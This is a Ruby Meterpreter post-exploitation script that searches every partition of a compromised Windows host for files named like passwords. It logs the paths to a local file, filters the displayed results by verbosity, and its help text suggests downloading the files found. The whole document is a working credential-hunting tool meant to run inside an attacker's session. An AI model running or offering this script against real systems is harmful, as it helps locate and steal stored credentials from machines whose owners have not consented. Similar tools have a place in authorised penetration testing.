
# $Id: find_password_files.rb 14034 2012-08-25 $
# $Revision: 1234 $
# Author: Shmuel Amar
# Version: 1.0.0


#set options
output = "/tmp/find_password_files#{rand(9999999)}.txt"
v = 'n'

@@exec_opts = Rex::Parser::Arguments.new(
    "-h" => [ false, "Help menu." ],
    "-q" => [ false, "quiet. no output." ],
    "-m" => [ false, "minimal output." ],
    "-o" => [ true, "output file. if not specify created in /tmp." ],
    "-v" => [ false, "verbose. show all results (include windir)." ],
)

@@exec_opts.parse(args) { |opt, idx, val|
    case opt
    when "-v"
        v = 'v'
    when "-m"
        v = 'm'
    when "-q"
        v = 'q'
    when "-o"
        output = val
    when "-h"
        usage
    end
}

#print help
def usage
    print_line("Search partitions for files containing the word pass.")
    print_line("All output will save to log file. Verbose modes affect only stdout.")
    print_line("Hint: use download to get files.")
    print_line("USAGE: run find_password_files <options>")
    print_line(@@exec_opts.usage)
    raise Rex::Script::Completed
end

#check for proper Meterpreter Platform
def unsupported
    print_error("This version of Meterpreter is not supported with this Script!")
    raise Rex::Script::Completed
end
unsupported if client.platform !~ /win32|win64/i

#main function. search for /pass/
def find_password_files(output_file, verbose)
    #try to write timestamp to file
    begin
        file_local_write(output_file,"#Started at #{Time.now}:")
    rescue ::Exception => e
        print_error("Error opening file #{output_file}:\n #{e.class} #{e}")
        raise e
    end
    begin
        count = 0
        count_view = 0
        print_status("Starting search. #{Time.now}:")
        print_status("Printing output to #{output_file}")
        #search filesystems for /pass/
        results = client.fs.file.search(nil,'*pass*',true)

        #for each result - echo to output file, show output by verbosity
        results.each do |file|
            file_local_write(output_file,"#{file['path']}\\#{file['name']}")
            count += 1
            #if quiet - no output.
            next if verbose == 'q'
            #if NOT verbose - prune windir
            next if verbose != 'v' and (file['path'].to_s)[4..12] =~ /windows\\/i
            #if minimal - only show txt, doc, xml, csv files
            next if verbose == 'm' and file['name'] !~ /\.txt|\.doc|\.xml|\.csv|\.xls/i
            print_status("\t#{file['path']}\\#{file['name']} (#{file['size']} bytes)")
            count_view += 1
        end
        print_status("End Search. #{Time.now}:")
        print_status("Found #{count} files. Showing #{count_view} files")
    rescue ::Exception => e
        print_error("Error searching:\n #{e.class} #{e}")
        raise e
    end
end

find_password_files(output, v)

